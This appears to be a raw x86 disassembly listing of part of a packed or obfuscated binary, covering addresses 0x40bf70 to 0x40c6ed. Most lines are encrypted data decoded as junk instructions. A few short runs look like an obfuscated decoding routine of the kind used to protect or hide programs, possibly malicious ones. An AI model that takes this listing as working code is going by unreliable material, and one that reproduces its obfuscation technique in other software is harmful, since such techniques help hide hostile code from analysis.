  40bf70:	add    BYTE PTR [esp+ecx*2+0x6c5b1bf9],dl
  40bf77:	dec    esp
  40bf78:	ins    DWORD PTR es:[edi],dx
  40bf79:	cwde   
  40bf7a:	lea    edi,[ecx+0x455b3179]
  40bf80:	xchg   DWORD PTR [ebx+0x7d8b1d48],esi
  40bf86:	or     BYTE PTR [ebx-0x75c945c1],cl
  40bf8c:	add    BYTE PTR [eax],al
  40bf8e:	xor    ax,dx
  40bf91:	mov    edx,0x3afc
  40bf96:	add    ax,dx
  40bf99:	cmp    ax,WORD PTR [edi]
  40bf9c:	je     0x40c934
  40bfa2:	mov    eax,DWORD PTR [ebp-0x14]
  40bfa5:	xor    eax,ecx
  40bfa7:	add    eax,esi
  40bfa9:	mov    DWORD PTR [ebp-0x24],eax
  40bfac:	jmp    0x40c2c5
  40bfb1:	int3   
  40bfb2:	into   
  40bfb3:	retf   
  40bfb4:	ror    cl,1
  40bfb6:	(bad)  
  40bfb8:	ficom  DWORD PTR [edi+ebx*4+0x6c]
  40bfbc:	cmc    
  40bfbd:	fisttp DWORD PTR [ecx+ebx*1]
  40bfc0:	(bad)  
  40bfc2:	xchg   esi,eax
  40bfc3:	js     0x40c03d
  40bfc5:	je     0x40c045
  40bfc7:	js     0x40c041
  40bfc9:	push   0x65e095fe
  40bfce:	mov    eax,0xd374c707
  40bfd3:	inc    edx
  40bfd4:	mov    DWORD PTR [ecx-0x1b],edi
  40bfd7:	mov    esp,0x29a8600c
  40bfdc:	adc    BYTE PTR [esi],ch
  40bfde:	daa    
  40bfdf:	sbb    eax,0x106bc151
  40bfe4:	push   ebx
  40bfe5:	ins    DWORD PTR es:[edi],dx
  40bfe6:	inc    edi
  40bfe7:	cwde   
  40bfe8:	mov    bh,0x7c
  40bfea:	inc    BYTE PTR [edx+0x741c8c82]
  40bff0:	mov    bl,BYTE PTR [ecx-0x193206ea]
  40bff6:	ds test dl,dl
  40bff9:	jl     0x40c047
  40bffb:	invd   
  40bffd:	fdivr  DWORD PTR [ebp-0x5e]
  40c000:	inc    eax
  40c001:	ja     0x40c033
  40c003:	fmul   QWORD PTR [ebp+ebx*2-0x4d55efac]
  40c00a:	(bad)  
  40c00b:	xchg   ecx,eax
  40c00c:	out    0xdd,eax
  40c00e:	mov    al,0xd
  40c010:	sbb    eax,0xc2548a5c
  40c015:	add    dh,ah
  40c017:	or     ah,dh
  40c019:	xor    DWORD PTR [eax-0x74],0x20
  40c01d:	rol    esi,0x5f
  40c020:	xor    DWORD PTR [ecx-0xf5684c2],0x77a98502
  40c02a:	push   es
  40c02b:	cmp    DWORD PTR [edi-0x58727b58],edx
  40c031:	jae    0x40bfbb
  40c033:	or     eax,0x5994b782
  40c038:	stc    
  40c039:	sub    esi,esi
  40c03b:	in     al,0x48
  40c03d:	clc    
  40c03e:	dec    ebx
  40c03f:	push   ebx
  40c040:	adc    BYTE PTR [eax+0x1],ah
  40c043:	loope  0x40c05e
  40c045:	jl     0x40c071
  40c047:	ds dec edi
  40c049:	shr    BYTE PTR [eax-0x502f714d],cl
  40c04f:	pop    edx
  40c050:	mov    bh,0x21
  40c052:	test   al,0x1e
  40c054:	std    
  40c055:	int    0xed
  40c057:	push   ss
  40c058:	lock out dx,al
  40c05a:	or     bl,BYTE PTR [ecx-0x72]
  40c05d:	and    BYTE PTR [ebp*8+0x3afa50cd],dl
  40c064:	cmp    al,0x28
  40c066:	adc    dh,BYTE PTR [eax+0x30161769]
  40c06c:	hlt    
  40c06d:	in     eax,0x2
  40c06f:	pop    ecx
  40c070:	cdq    
  40c071:	push   es
  40c072:	sbb    al,0xcb
  40c074:	cld    
  40c075:	(bad)  [ebp+ebp*4+0xb]
  40c079:	inc    ecx
  40c07a:	cmp    cl,BYTE PTR [ecx-0x708896df]
  40c080:	popa   
  40c081:	shl    DWORD PTR [ebx+0x35b59009],0x74
  40c088:	mov    edi,DWORD PTR [eax+ecx*8-0x61]
  40c08c:	adc    BYTE PTR [edx+0x6d],0x65
  40c090:	mov    ebx,0x7d703f22
  40c095:	mov    ss,WORD PTR [ecx-0x1db4f2ee]
  40c09b:	ret    0x43f
  40c09e:	xor    bh,BYTE PTR [edx]
  40c0a0:	mov    edi,0xba1af2d1
  40c0a5:	and    BYTE PTR [esi+0x3e575868],bl
  40c0ab:	xor    cl,BYTE PTR [ebp-0x59fc1ad0]
  40c0b1:	pop    ebp
  40c0b2:	pop    ebp
  40c0b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0b4:	stos   DWORD PTR es:[edi],eax
  40c0b5:	add    DWORD PTR [ebx+0x7d8e21e],0x8a1ff1f1
  40c0bf:	add    DWORD PTR [ebx],0x51131819
  40c0c5:	jecxz  0x40c131
  40c0c7:	xor    DWORD PTR [ecx+0x472e5cc5],edx
  40c0cd:	popa   
  40c0ce:	pop    ds
  40c0cf:	push   edx
  40c0d0:	ret    0xe762
  40c0d3:	and    BYTE PTR [esi+0x874990a],al
  40c0d9:	div    BYTE PTR [esi]
  40c0db:	test   esi,edi
  40c0dd:	push   ss
  40c0de:	cmp    BYTE PTR [edx+0x42],ah
  40c0e1:	popa   
  40c0e2:	arpl   WORD PTR [esi+0x79568a35],si
  40c0e8:	int3   
  40c0e9:	inc    ebx
  40c0ea:	ror    bh,0x85
  40c0ed:	icebp  
  40c0ee:	gs out 0x26,al
  40c0f1:	xchg   esp,eax
  40c0f2:	jne    0x40c07d
  40c0f4:	cmp    DWORD PTR [eax],esi
  40c0f6:	clc    
  40c0f7:	or     DWORD PTR [ecx],edx
  40c0f9:	pusha  
  40c0fa:	xchg   edi,eax
  40c0fb:	mov    esp,0x99b91942
  40c100:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c101:	ret    0x1539
  40c104:	cdq    
  40c105:	fs gs push ds
  40c108:	test   eax,0x2c7a829a
  40c10d:	hlt    
  40c10e:	sub    DWORD PTR [ebp-0x76],edi
  40c111:	ret    0xcc39
  40c114:	jmp    0x5c60:0x4b65967a
  40c11b:	adc    edx,edi
  40c11d:	xlat   BYTE PTR ds:[ebx]
  40c11e:	data16 xlat BYTE PTR ds:[ebx]
  40c120:	push   cs
  40c121:	or     bh,bh
  40c123:	in     eax,dx
  40c124:	loopne 0x40c17a
  40c126:	sub    al,0x37
  40c128:	and    eax,ebp
  40c12a:	pop    edi
  40c12b:	and    edx,edx
  40c12d:	jle    0x40c16c
  40c12f:	pusha  
  40c130:	add    eax,0xadbc0dcd
  40c135:	imul   edx,DWORD PTR [edi],0x4c
  40c138:	cmp    esp,DWORD PTR [edx+0x6c3649d3]
  40c13e:	lahf   
  40c13f:	call   0x3821e99a
  40c144:	lods   al,BYTE PTR ds:[esi]
  40c145:	xchg   edx,eax
  40c146:	jne    0x40c0ed
  40c148:	or     ah,BYTE PTR [esp+eiz*4]
  40c14b:	hlt    
  40c14c:	jno    0x40c16e
  40c14e:	rcl    DWORD PTR [ecx],cl
  40c150:	inc    edx
  40c151:	test   BYTE PTR [eax],0x56
  40c154:	jnp    0x40c103
  40c156:	cmp    ebp,DWORD PTR [edx-0x5b]
  40c159:	in     eax,dx
  40c15a:	xor    eax,0xa
  40c15d:	int    0xfc
  40c15f:	mov    esi,ds
  40c161:	lods   al,BYTE PTR ds:[esi]
  40c162:	push   esi
  40c163:	retf   
  40c164:	enter  0x5253,0x68
  40c168:	xor    al,0x33
  40c16a:	int3   
  40c16b:	(bad)  
  40c16c:	mov    esi,0x55977b5a
  40c171:	gs (bad) 
  40c174:	sub    eax,DWORD PTR [edx]
  40c176:	sbb    eax,0xd4113eb3
  40c17b:	add    dh,BYTE PTR [ebx+0x5f33b743]
  40c181:	sbb    dh,BYTE PTR ds:0xd7256052
  40c187:	loope  0x40c176
  40c189:	and    cl,bh
  40c18b:	xor    edi,DWORD PTR [eax+0x4e]
  40c18e:	ss ss jns 0x40c166
  40c192:	inc    esi
  40c193:	mov    ebx,0x4f5c5c26
  40c198:	sbb    BYTE PTR [esi-0x33eedb63],cl
  40c19e:	push   esi
  40c19f:	aaa    
  40c1a0:	imul   ecx,esp,0x3cf5e7d4
  40c1a6:	adc    al,0xdd
  40c1a8:	and    ebx,ebp
  40c1aa:	xchg   esi,eax
  40c1ab:	dec    ebp
  40c1ac:	mov    ebp,0xb308083
  40c1b1:	nop
  40c1b2:	sahf   
  40c1b3:	dec    edx
  40c1b4:	cs icebp 
  40c1b6:	jmp    0x40c1c3
  40c1b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1b9:	sub    al,0xd7
  40c1bb:	dec    esi
  40c1bc:	mov    ebx,0x628acc2f
  40c1c1:	fimul  WORD PTR [esi-0x1f]
  40c1c4:	sub    BYTE PTR [ecx+esi*1],dh
  40c1c7:	add    BYTE PTR [esi+ebp*1],dh
  40c1ca:	cmc    
  40c1cb:	imul   ebp,DWORD PTR [ebp+0x2915bb83],0xffffff96
  40c1d2:	push   edi
  40c1d3:	bts    DWORD PTR [edx+0x10],ebp
  40c1d7:	and    al,0x35
  40c1d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1da:	ins    DWORD PTR es:[edi],dx
  40c1db:	sbb    al,0x83
  40c1dd:	adc    al,0x7b
  40c1df:	addr16 cdq 
  40c1e1:	mul    BYTE PTR [edx-0x2b705141]
  40c1e7:	das    
  40c1e8:	and    al,0xdb
  40c1ea:	pop    edx
  40c1eb:	mov    BYTE PTR [edi-0x67f93d44],ah
  40c1f1:	shl    al,0x36
  40c1f4:	pop    edi
  40c1f5:	test   BYTE PTR [edx],dh
  40c1f7:	(bad)  
  40c1f8:	xor    DWORD PTR [edx-0x7e7374f1],eax
  40c1fe:	stos   BYTE PTR es:[edi],al
  40c1ff:	je     0x40c227
  40c201:	stos   BYTE PTR es:[edi],al
  40c202:	aad    0xa5
  40c204:	mov    ebp,DWORD PTR ds:0x52934f54
  40c20a:	call   0xe584:0xc721fe75
  40c211:	sbb    esi,eax
  40c213:	xchg   edx,eax
  40c214:	mov    ebx,0xe41d119e
  40c219:	push   ebx
  40c21a:	ror    DWORD PTR [ecx],0xf5
  40c21d:	cs fdiv st,st(1)
  40c220:	sbb    BYTE PTR [ebp-0x56dca99d],ah
  40c226:	or     eax,0x85c06282
  40c22b:	pop    ebp
  40c22c:	push   0xffffff81
  40c22e:	mov    dl,0x25
  40c230:	xchg   ebx,eax
  40c231:	clc    
  40c232:	adc    al,0xa9
  40c234:	push   0xffffffeb
  40c236:	fisub  DWORD PTR [esi+0x35]
  40c239:	sub    eax,0x5d58f78e
  40c23e:	jne    0x40c29a
  40c240:	iret   
  40c241:	jns    0x40c269
  40c243:	inc    esi
  40c244:	xor    dl,BYTE PTR [edi-0x49]
  40c247:	jbe    0x40c1e4
  40c249:	test   edx,ebp
  40c24b:	mov    fs,WORD PTR [ebp-0x3203811d]
  40c251:	mov    ch,0x9e
  40c253:	jmp    0x6d8d:0x1a666870
  40c25a:	or     eax,0x4c714827
  40c25f:	push   esp
  40c260:	iret   
  40c261:	cs cdq 
  40c263:	or     dl,ch
  40c265:	mov    cl,BYTE PTR [eax]
  40c267:	jbe    0x40c272
  40c269:	mov    edi,0x107a117a
  40c26e:	gs bnd jno 0x40c20c
  40c272:	out    0xc6,al
  40c274:	stos   DWORD PTR es:[edi],eax
  40c275:	jo     0x40c2bc
  40c277:	mov    bl,0xca
  40c279:	repnz fisttp QWORD PTR [esi+0x33]
  40c27d:	cmp    BYTE PTR [edi+0x56],dh
  40c280:	fs jmp 0x40c22f
  40c283:	jl     0x40c20e
  40c285:	cmp    eax,0x8ddbd12d
  40c28a:	mov    cl,0x69
  40c28c:	in     al,dx
  40c28d:	sub    al,0x5f
  40c28f:	(bad)  
  40c290:	mov    esi,0x2a2e6dc7
  40c295:	jbe    0x40c28c
  40c297:	cdq    
  40c298:	shl    DWORD PTR [esi],cl
  40c29a:	pusha  
  40c29b:	ds jb  0x40c30a
  40c29e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c29f:	mov    bl,0xc8
  40c2a1:	mov    bh,0xf4
  40c2a3:	dec    ebp
  40c2a4:	in     eax,dx
  40c2a5:	outs   dx,DWORD PTR ds:[esi]
  40c2a6:	mov    bh,0x99
  40c2a8:	icebp  
  40c2a9:	imul   ebp,edi,0x4ab6961e
  40c2af:	add    dh,dh
  40c2b1:	ins    BYTE PTR es:[edi],dx
  40c2b2:	jge    0x40c2bb
  40c2b4:	fldenv [edi]
  40c2b6:	jmp    0x39647bd1
  40c2bb:	popf   
  40c2bc:	jnp    0x40c24d
  40c2be:	jbe    0x40c2e2
  40c2c0:	out    0x51,eax
  40c2c2:	xlat   BYTE PTR ds:[ebx]
  40c2c3:	sub    ebx,0x66d8458b
  40c2c9:	mov    edi,DWORD PTR [ebp-0x2c]
  40c2cc:	mov    ebx,0x8a36
  40c2d1:	jmp    0x40c5ea
  40c2d6:	xlat   BYTE PTR ds:[ebx]
  40c2d7:	cmp    al,0xc4
  40c2d9:	ds fcmovnb st,st(6)
  40c2dc:	(bad)  
  40c2de:	js     0x40c267
  40c2e0:	adc    BYTE PTR [eax+0x71],bh
  40c2e3:	fisub  DWORD PTR [edi+0x3]
  40c2e6:	cmp    bl,BYTE PTR [ebx+0x7e747878]
  40c2ec:	js     0x40c366
  40c2ee:	les    edi,FWORD PTR [ecx+0x5d7bd7bf]
  40c2f4:	retf   0x18c3
  40c2f7:	push   eax
  40c2f8:	push   ebp
  40c2f9:	xchg   edi,eax
  40c2fa:	dec    ecx
  40c2fb:	cld    
  40c2fc:	and    edi,DWORD PTR [ebp-0x46]
  40c2ff:	fcmovnb st,st(5)
  40c301:	push   esi
  40c302:	sub    eax,0xa0b28bd7
  40c307:	or     ecx,DWORD PTR [eax-0x43]
  40c30a:	ins    BYTE PTR es:[edi],dx
  40c30b:	mov    ah,0x1e
  40c30d:	jns    0x40c335
  40c30f:	push   ss
  40c310:	into   
  40c311:	lods   al,BYTE PTR ds:[esi]
  40c312:	repz push ecx
  40c314:	xchg   ebx,eax
  40c315:	sahf   
  40c316:	push   ds
  40c317:	shr    BYTE PTR [ebp-0x1a],1
  40c31a:	repz retfw 
  40c31d:	dec    ebp
  40c31e:	mov    DWORD PTR [ecx+0x71],eax
  40c321:	test   DWORD PTR [edx+edi*4-0x1a],edi
  40c325:	sbb    BYTE PTR [ebx],dh
  40c327:	and    cl,BYTE PTR [edi-0xc]
  40c32a:	je     0x40c369
  40c32c:	gs jecxz 0x40c2bc
  40c32f:	(bad)  
  40c330:	jmp    0x93a8:0xa3ebcdde
  40c337:	nop
  40c338:	or     DWORD PTR [ebp+edx*2-0x72],esp
  40c33c:	out    0x45,al
  40c33e:	cmp    esp,esp
  40c340:	ret    0xf8de
  40c343:	inc    edx
  40c344:	or     DWORD PTR [ecx-0x3e477f31],eax
  40c34a:	push   es
  40c34b:	out    0x67,al
  40c34d:	fadd   st,st(4)
  40c34f:	pop    ecx
  40c350:	adc    eax,ecx
  40c352:	adc    DWORD PTR [ebx*4+0x13372fd6],ebx
  40c359:	xor    DWORD PTR [ebx+ebx*4-0x57],0x314ec05a
  40c361:	jecxz  0x40c2fb
  40c363:	mov    BYTE PTR [edi+0x77],ah
  40c366:	lahf   
  40c367:	(bad)  
  40c368:	xor    eax,0x795893aa
  40c36d:	cmp    BYTE PTR [edx],dl
  40c36f:	sbb    BYTE PTR [edi-0x3d0754af],0x26
  40c376:	mov    al,0x1e
  40c378:	adc    eax,0xb5af2108
  40c37d:	xchg   ecx,eax
  40c37e:	xor    BYTE PTR [eax+0x78acaaca],dh
  40c384:	xchg   esp,eax
  40c385:	push   esp
  40c386:	pop    ebp
  40c387:	add    BYTE PTR [ebx+0x28a5f06b],ch
  40c38d:	sbb    DWORD PTR [eax+0x6a520fc1],ebx
  40c393:	and    DWORD PTR [edi+ebp*2-0x72],eax
  40c397:	add    al,0x2
  40c399:	push   0xbe495c07
  40c39e:	shr    BYTE PTR [edi-0x2f],cl
  40c3a1:	push   0x7b082f7f
  40c3a6:	fcomi  st,st(3)
  40c3a8:	adc    eax,0x120d5a2a
  40c3ad:	fistp  QWORD PTR [edi]
  40c3af:	sub    al,0xf2
  40c3b1:	pop    es
  40c3b2:	stos   DWORD PTR es:[edi],eax
  40c3b3:	sub    DWORD PTR [edx-0x5276444e],esi
  40c3b9:	loopne 0x40c3ce
  40c3bb:	ins    DWORD PTR es:[edi],dx
  40c3bc:	gs dec ebp
  40c3be:	retf   0x55e1
  40c3c1:	push   0x669a4f37
  40c3c6:	push   0x8b237cac
  40c3cb:	(bad)  
  40c3cd:	scas   al,BYTE PTR es:[edi]
  40c3ce:	in     eax,dx
  40c3cf:	cwde   
  40c3d0:	not    BYTE PTR [ecx]
  40c3d2:	cwde   
  40c3d3:	xchg   ecx,eax
  40c3d4:	(bad)  
  40c3d5:	clc    
  40c3d6:	ficomp WORD PTR [ecx-0x18b7e517]
  40c3dc:	adc    ebp,DWORD PTR [esi]
  40c3de:	test   BYTE PTR [esi-0x23],dh
  40c3e1:	and    ebp,DWORD PTR [ecx+0x37]
  40c3e4:	mov    al,ds:0xff355400
  40c3e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3ea:	push   ecx
  40c3eb:	jae    0x40c395
  40c3ed:	lods   al,BYTE PTR ds:[esi]
  40c3ee:	(bad)  
  40c3ef:	std    
  40c3f0:	cmp    bl,BYTE PTR [edx]
  40c3f2:	scas   eax,DWORD PTR es:[edi]
  40c3f3:	shl    DWORD PTR [eax],0xad
  40c3f6:	test   BYTE PTR [ecx-0x443cdc16],ch
  40c3fc:	cmp    esp,esp
  40c3fe:	xchg   ebp,eax
  40c3ff:	(bad)  
  40c400:	jge    0x40c442
  40c402:	dec    ecx
  40c403:	sbb    DWORD PTR [edi+ecx*1+0x41],eax
  40c407:	push   0x3b
  40c409:	ins    DWORD PTR es:[edi],dx
  40c40a:	inc    eax
  40c40b:	push   0x7b
  40c40d:	xchg   BYTE PTR [ebp+0x3c84cbe3],bl
  40c413:	mov    bh,0x7a
  40c415:	outs   dx,DWORD PTR ds:[esi]
  40c416:	mov    ch,0x3a
  40c418:	sbb    BYTE PTR [ebx+0x2e],ah
  40c41b:	and    BYTE PTR [esi-0x4f8cb5c5],0xed
  40c422:	jne    0x40c413
  40c424:	push   cs
  40c425:	aam    0x8b
  40c427:	mov    bl,0xc9
  40c429:	xchg   ecx,eax
  40c42a:	(bad)  
  40c42b:	loopne 0x40c448
  40c42d:	xor    al,0x2a
  40c42f:	pop    ds
  40c430:	and    al,0xec
  40c432:	aaa    
  40c433:	cli    
  40c434:	push   0xb1ebfe5b
  40c439:	ret    0x6537
  40c43c:	mov    al,ds:0x9d66204
  40c441:	out    dx,al
  40c442:	dec    esi
  40c443:	in     al,0xa6
  40c445:	inc    ebx
  40c446:	dec    esi
  40c447:	mov    WORD PTR [esi+0x11],ds
  40c44a:	adc    bh,ah
  40c44c:	scas   eax,DWORD PTR es:[edi]
  40c44d:	fcomp  DWORD PTR [edi-0x5f]
  40c450:	div    DWORD PTR [ecx]
  40c452:	push   esi
  40c453:	(bad)  
  40c454:	push   es
  40c455:	mov    ah,0x83
  40c457:	xchg   ebx,eax
  40c458:	mov    dl,0x2c
  40c45a:	test   DWORD PTR [ebp-0x686405d],eax
  40c460:	adc    BYTE PTR [esi+0xb],0x9c
  40c464:	retf   0x2fc3
  40c467:	cdq    
  40c468:	mov    eax,0x5e874dfb
  40c46d:	add    al,0xf2
  40c46f:	loopne 0x40c4d4
  40c471:	inc    ebx
  40c472:	sbb    dh,BYTE PTR [edx-0x68]
  40c475:	mov    dh,0x48
  40c477:	mov    ebp,ebp
  40c479:	in     al,0x23
  40c47b:	push   ebx
  40c47c:	lods   al,BYTE PTR ds:[esi]
  40c47d:	xchg   ecx,eax
  40c47e:	enter  0x2abc,0xfa
  40c482:	xchg   ecx,eax
  40c483:	stc    
  40c484:	jge    0x40c48f
  40c486:	push   0xe8befe5e
  40c48b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c48c:	loope  0x40c489
  40c48e:	jmp    0xcf62:0x89cdc748
  40c495:	xchg   ebp,eax
  40c496:	in     al,0x43
  40c498:	inc    ecx
  40c499:	pop    ds
  40c49a:	cdq    
  40c49b:	jb     0x40c445
  40c49d:	sub    bl,BYTE PTR [ecx-0x64]
  40c4a0:	pop    esp
  40c4a1:	(bad)  [esi]
  40c4a3:	dec    esp
  40c4a4:	xchg   esp,eax
  40c4a5:	out    0x7a,eax
  40c4a7:	scas   eax,DWORD PTR es:[edi]
  40c4a8:	retf   0xcf47
  40c4ab:	push   edx
  40c4ac:	retf   0x742a
  40c4af:	ret    
  40c4b0:	rol    BYTE PTR [ecx],0xcc
  40c4b3:	les    edx,FWORD PTR [ecx+0x26]
  40c4b6:	cld    
  40c4b7:	loope  0x40c4b5
  40c4b9:	nop    esi
  40c4bc:	sub    al,0xd9
  40c4be:	inc    ebp
  40c4bf:	aad    0xf1
  40c4c1:	adc    DWORD PTR [esi+0xe],ebx
  40c4c4:	or     DWORD PTR [edi],0xffffffe0
  40c4c7:	dec    ebx
  40c4c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4ca:	cmc    
  40c4cb:	mov    ds:0x384ecffc,al
  40c4d0:	call   0xea97:0x896fa691
  40c4d7:	fisubr DWORD PTR [edi-0x4]
  40c4da:	push   ss
  40c4db:	jne    0x40c491
  40c4dd:	mov    esp,0x5552b56f
  40c4e2:	loop   0x40c4bc
  40c4e4:	sbb    esi,ebx
  40c4e6:	pop    ebx
  40c4e7:	mov    edi,0x2768a56a
  40c4ec:	jp     0x40c4c1
  40c4ee:	ins    BYTE PTR es:[edi],dx
  40c4ef:	sub    al,0xc4
  40c4f1:	out    dx,al
  40c4f2:	push   ebx
  40c4f3:	inc    edi
  40c4f4:	popf   
  40c4f5:	outs   dx,DWORD PTR ds:[esi]
  40c4f6:	test   al,0xc5
  40c4f8:	sbb    DWORD PTR [edx+0x25cdb77c],esp
  40c4fe:	inc    ebx
  40c4ff:	popf   
  40c500:	jae    0x40c502
  40c502:	or     dl,dl
  40c504:	mov    ds,ebp
  40c506:	dec    eax
  40c507:	aad    0x1e
  40c509:	icebp  
  40c50a:	sar    ah,1
  40c50c:	xor    BYTE PTR [ebx+edi*8+0x78],0x39
  40c511:	push   ebp
  40c512:	and    dh,BYTE PTR [bp+di-0x6690]
  40c517:	or     eax,DWORD PTR [ebx+0x52]
  40c51a:	dec    edi
  40c51b:	leave  
  40c51c:	xchg   edi,ebx
  40c51e:	and    al,BYTE PTR [ebx-0x3eb536c0]
  40c524:	xchg   BYTE PTR gs:[ebx+0x349d315a],ch
  40c52b:	fbstp  TBYTE PTR ds:[edi+edx*1-0x46]
  40c530:	and    esp,ecx
  40c532:	dec    BYTE PTR [edx-0x737f28d2]
  40c538:	out    0xd3,eax
  40c53a:	jbe    0x40c4d0
  40c53c:	es ja  0x40c562
  40c53f:	dec    ebp
  40c540:	pop    edi
  40c541:	mov    eax,ds:0xc443e53b
  40c546:	cld    
  40c547:	inc    ebx
  40c548:	test   BYTE PTR [edx+esi*1-0x31],dl
  40c54c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c54d:	int3   
  40c54e:	or     al,0x36
  40c550:	ja     0x40c552
  40c552:	test   al,0x4e
  40c554:	xor    ch,BYTE PTR [ebx+0x6e]
  40c557:	inc    eax
  40c558:	daa    
  40c559:	mov    edx,0xf0b32ec0
  40c55e:	mov    ecx,0x5dd64c5d
  40c563:	or     al,0x70
  40c565:	(bad)  
  40c566:	fist   WORD PTR [esi]
  40c568:	mov    dh,BYTE PTR [ebp+0x2bd2ce]
  40c56e:	cmp    DWORD PTR [ecx-0x649b18f6],ecx
  40c574:	scas   eax,DWORD PTR es:[edi]
  40c575:	xchg   BYTE PTR ds:0xfed45dec,dl
  40c57b:	lds    esi,FWORD PTR ds:[ecx-0x2b6a5074]
  40c582:	add    ebp,eax
  40c584:	scas   eax,DWORD PTR es:[edi]
  40c585:	imul   edx,DWORD PTR [esi+ebx*8+0x4191d979],0xffffffc0
  40c58d:	enter  0xe0b1,0xb5
  40c591:	dec    eax
  40c592:	inc    ebp
  40c593:	cmp    BYTE PTR [edx+0x8],cl
  40c596:	xchg   dl,dl
  40c598:	sbb    DWORD PTR [eax-0x68],edi
  40c59b:	(bad)  
  40c59c:	aas    
  40c59d:	outs   dx,BYTE PTR ds:[esi]
  40c59e:	mov    edx,0x55da256b
  40c5a3:	inc    ebp
  40c5a4:	xchg   edi,eax
  40c5a5:	pop    es
  40c5a6:	stc    
  40c5a7:	jns    0x40c5a3
  40c5a9:	dec    esi
  40c5aa:	fwait
  40c5ab:	das    
  40c5ac:	repz (bad) [edi+0x78]
  40c5b0:	pop    ebx
  40c5b1:	push   0x867e4b5b
  40c5b6:	xlat   BYTE PTR ds:[ebx]
  40c5b7:	idiv   ebx
  40c5b9:	mov    edx,DWORD PTR [ecx+0x42]
  40c5bc:	cmp    DWORD PTR [ebx-0x457d645e],0x20
  40c5c3:	push   ebp
  40c5c4:	sbb    DWORD PTR [edx],edx
  40c5c6:	mov    ecx,0x76ab18e1
  40c5cb:	xor    dh,BYTE PTR fs:[edi+0x50800d06]
  40c5d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5d3:	popa   
  40c5d4:	daa    
  40c5d5:	cmp    DWORD PTR [eax+0x1b],ebx
  40c5d8:	sbb    DWORD PTR [esi],eax
  40c5da:	loopne 0x40c5c5
  40c5dc:	fiadd  WORD PTR [ecx+0x77]
  40c5df:	out    0xea,al
  40c5e1:	push   esi
  40c5e2:	jle    0x40c625
  40c5e4:	jp     0x40c65d
  40c5e6:	outs   dx,DWORD PTR ds:[esi]
  40c5e7:	stos   DWORD PTR es:[edi],eax
  40c5e8:	jne    0x40c573
  40c5ea:	xor    di,bx
  40c5ed:	add    di,dx
  40c5f0:	movzx  edx,di
  40c5f3:	mov    edi,DWORD PTR [ebp-0x8]
  40c5f6:	xor    edi,ecx
  40c5f8:	lea    edx,[edx+edi*1+0x327298]
  40c5ff:	add    DWORD PTR [eax],edx
  40c601:	jmp    0x40c91a
  40c606:	cmp    eax,0xd9d2c1d7
  40c60b:	fcmove st,st(5)
  40c60d:	(bad)  ds:0x67d2d2f7
  40c613:	clc    
  40c614:	cmp    BYTE PTR [esi+0x36],ah
  40c617:	cwde   
  40c618:	js     0x40c692
  40c61a:	je     0x40c69a
  40c61c:	js     0x40c696
  40c61e:	push   ebp
  40c61f:	arpl   WORD PTR [edx+0x3d],dx
  40c622:	test   eax,0x8b3441a0
  40c627:	or     al,0xdb
  40c629:	cmp    al,0x97
  40c62b:	adc    esp,eax
  40c62d:	repz mul BYTE PTR [edi+ecx*8]
  40c631:	xor    edi,DWORD PTR [esi+0x7886652a]
  40c637:	bnd jle 0x40c63f
  40c63a:	mov    ecx,edx
  40c63c:	int3   
  40c63d:	add    DWORD PTR [eax+eiz*2],ebx
  40c640:	push   esi
  40c641:	data16 mov WORD PTR [ebx*4-0x21444966],ds
  40c649:	sahf   
  40c64a:	jle    0x40c65c
  40c64c:	dec    esi
  40c64d:	lock inc ecx
  40c64f:	dec    ebp
  40c650:	mov    esi,0xd510d497
  40c655:	out    dx,al
  40c656:	mov    DWORD PTR [edi+edi*2+0x0],ecx
  40c65a:	(bad)  
  40c65b:	fcomp  st(7)
  40c65d:	hlt    
  40c65e:	lods   al,BYTE PTR ds:[esi]
  40c65f:	(bad)  
  40c660:	call   0xe39f:0x39e0d885
  40c667:	or     DWORD PTR [ecx-0x1],0x1b5f947a
  40c66e:	retf   
  40c66f:	fld    DWORD PTR [esi+esi*8-0x1f]
  40c673:	cmp    DWORD PTR [edx],0x35
  40c676:	arpl   di,si
  40c678:	ss int 0xb0
  40c67b:	sub    BYTE PTR [edi-0x37],0x1a
  40c67f:	(bad)  
  40c680:	push   esi
  40c681:	mov    eax,0x57010af8
  40c686:	mov    cl,0x71
  40c688:	lods   al,BYTE PTR ds:[esi]
  40c689:	xchg   esi,eax
  40c68a:	pusha  
  40c68b:	inc    edi
  40c68c:	sbb    al,BYTE PTR [edi+0x5a]
  40c68f:	adc    eax,DWORD PTR [ebp-0xe]
  40c692:	and    edx,DWORD PTR [eax]
  40c694:	jecxz  0x40c631
  40c696:	mov    ds:0x3733f7ac,eax
  40c69b:	jl     0x40c6bc
  40c69d:	inc    esi
  40c69e:	cmp    eax,0xf5ddd46a
  40c6a3:	dec    ebp
  40c6a4:	sbb    edx,DWORD PTR [ebx-0x1152d499]
  40c6aa:	and    BYTE PTR [esi],cl
  40c6ac:	sbb    edi,esp
  40c6ae:	pusha  
  40c6af:	hlt    
  40c6b0:	push   ebx
  40c6b1:	or     DWORD PTR [edi+0x8],ecx
  40c6b4:	pop    esi
  40c6b5:	test   eax,0xdb748226
  40c6ba:	mov    ds:0x74725502,al
  40c6bf:	mov    ebx,0x81ad449f
  40c6c4:	push   ss
  40c6c5:	pop    edi
  40c6c6:	sar    cl,cl
  40c6c8:	push   es
  40c6c9:	xchg   edx,eax
  40c6ca:	rol    BYTE PTR [edi+edi*4+0x22f46707],1
  40c6d1:	fwait
  40c6d2:	pop    es
  40c6d3:	jae    0x40c754
  40c6d5:	ret    
  40c6d6:	and    DWORD PTR [edi+edx*8],edi
  40c6d9:	push   0xe
  40c6db:	inc    eax
  40c6dc:	pop    eax
  40c6dd:	jb     0x40c72d
  40c6df:	add    eax,0x467c7c12
  40c6e4:	stos   BYTE PTR es:[edi],al
  40c6e5:	fiadd  DWORD PTR [edi-0x4e806d7e]
  40c6eb:	pop    es
  40c6ec:	stc    
  40c6ed:	mov    ebp,0x1e89d48a
